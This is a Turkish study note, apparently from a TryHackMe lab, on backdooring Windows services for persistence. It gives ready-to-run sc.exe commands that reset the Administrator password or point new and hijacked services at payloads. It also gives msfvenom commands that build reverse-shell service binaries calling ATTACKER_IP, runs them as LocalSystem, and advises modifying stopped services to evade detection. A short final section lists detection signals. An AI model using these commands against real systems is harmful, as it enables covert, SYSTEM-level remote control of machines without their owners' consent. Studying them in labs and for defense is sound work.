---
title: "Using Windows Services"
date: 2026-10-03
tags: [windows, persistence, services]
---
# Using Windows Services

**Temel mantık**

Windows servisleri kalıcılık için ideal bir mekanizmadır çünkü **makine her başladığında arka planda otomatik çalışacak** şekilde yapılandırılabilirler. Bir servis özünde arka planda çalışan bir executable'dır. Yapılandırırken iki şeyi belirlersin: hangi executable'ın kullanılacağı ve servisin makine açılışında otomatik mi yoksa manuel mi başlayacağı. Eğer bir servisi bizim için bir şey çalıştıracak hale getirebilirsek, kurban makine her yeniden başladığında kontrolü geri kazanırız.

İki ana yaklaşım var: **yeni bir servis oluşturmak** ya da **mevcut bir servisi değiştirmek**.

---

#### Yöntem 1 — Yeni backdoor servisi oluşturma

**Basit versiyon (parola sıfırlama):**

cmd

```cmd
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

Servis başladığında `net user` komutu çalışır ve Administrator parolasını `Passwd123` yapar. `start= auto` sayesinde kullanıcı etkileşimi olmadan otomatik çalışır.

> **Kritik sözdizimi detayı:** Her `=` işaretinden **sonra bir boşluk** olmalı (`binPath= "..."`), yoksa komut çalışmaz. Bu `sc.exe`'nin bilinen bir tuhaflığıdır.

**Reverse shell versiyonu:**

Parola sıfırlamak yerine bir reverse shell de bağlayabilirsin. Ama burada **önemli bir incelik** var: servis executable'ları sıradan exe değildir — sistemin onları yönetebilmesi için **belirli bir protokolü** (Service Control Manager ile haberleşme) uygulamaları gerekir. Normal bir msfvenom exe'si servis olarak başlatıldığında kısa sürede "zaman aşımı" ile ölür. Bu yüzden msfvenom'da özel **`exe-service`** formatı kullanılır:

shell

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

Bu exe hedefe (ör. `C:\Windows`) kopyalanır ve servisin `binPath`'i ona yönlendirilir:

cmd

```cmd
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

Servis başlayınca saldırgana bağlantı düşer.

---

#### Yöntem 2 — Mevcut servisi değiştirme (daha sinsi)

**Neden?** Yeni servis oluşturmak işe yarar ama **blue team ağ genelinde yeni servis oluşturmalarını izliyor olabilir** (yeni servis = güçlü bir IOC). Tespitten kaçınmak için sıfırdan yaratmak yerine mevcut bir servisi ele geçirmek daha mantıklıdır. En iyi aday genellikle **devre dışı / durdurulmuş (disabled/stopped) bir servistir** — çünkü onu değiştirmek kullanıcının fark edeceği bir kesintiye yol açmaz (çalışan bir servisi bozarsan bir şeyler çöker, dikkat çeker).

**Servisleri listeleme:**

cmd

```cmd
sc.exe query state=all
```

Durdurulmuş bir servis bul (ör. THMService3).

**Servis konfigürasyonunu inceleme:**

cmd

```cmd
sc.exe qc THMService3
```

**Persistence için önemli olan 3 parametre:**

1. **`BINARY_PATH_NAME`** → bizim payload'umuza işaret etmeli (çalışacak executable).
2. **`START_TYPE`** → **AUTO_START** olmalı ki kullanıcı etkileşimi olmadan, açılışta kendiliğinden çalışsın.
3. **`SERVICE_START_NAME`** → servisin hangi hesap altında çalışacağı. Tercihen **LocalSystem** olmalı — böylece payload **SYSTEM yetkisiyle** çalışır (en yüksek yerel yetki). Örnekteki servis başlangıçta `NT AUTHORITY\Local Service` ile çalışıyordu (düşük yetki); bunu LocalSystem'e çekmek önemli bir yetki kazanımıdır.

**Payload oluşturma:**

shell

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

(Yine `exe-service` formatı, aynı sebep.)

**Servisi yeniden yapılandırma:**

cmd

```cmd
sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

Burada `config` komutu tek seferde üç parametreyi birden ayarlıyor: yeni binary yolu, otomatik başlatma ve LocalSystem hesabı. (`obj=` → servisin çalışacağı hesabı belirler.)

Sonra tekrar `sc.exe qc THMservice3` ile üç değerin de doğru oturduğunu teyit edersin.

---

#### İki yöntemin karşılaştırması

||Yeni servis oluştur|Mevcut servisi değiştir|
|---|---|---|
|Kolaylık|Daha basit|Önce uygun aday bulmak gerek|
|Tespit riski|Yüksek (yeni servis = IOC)|Düşük (var olan servis kullanılır)|
|İdeal hedef|—|Durdurulmuş/disabled servis|

---

#### Ortak noktalar ve tespit yüzeyi

- **`exe-service` zorunluluğu:** Her iki yöntemde de reverse shell için normal exe değil, servis protokolünü uygulayan `exe-service` formatı kullanılmalı — yoksa servis başlar başlamaz ölür.
- **SYSTEM hedefi:** `obj= "LocalSystem"` ile çalışan servis payload'ı SYSTEM bağlamında koşar, bu da hem yetki yükseltme hem de güçlü persistence demektir.
- **Tespit için bakılacaklar:** Yeni servis oluşturma olayları (Event ID 7045), mevcut servislerin `binPath`/`ServiceStartName` değişiklikleri, alışılmadık konumlardaki (`C:\Windows\rev-svc.exe` gibi) servis binary'leri, ve servis başlangıcıyla tetiklenen beklenmedik ağ bağlantıları. Servis konfigürasyonlarının bütünlüğünü izlemek bu tekniğin temel tespit yoludur.

---

**Up:** [Windows Persistence - Index](Windows%20Persistence%20-%20Index.md)
**Related:** [Windows Local Persistence](Windows%20Local%20Persistence.md) · [SCHtask](SCHtask.md) · [Backdooring Existing Services](Backdooring%20Existing%20Services.md)
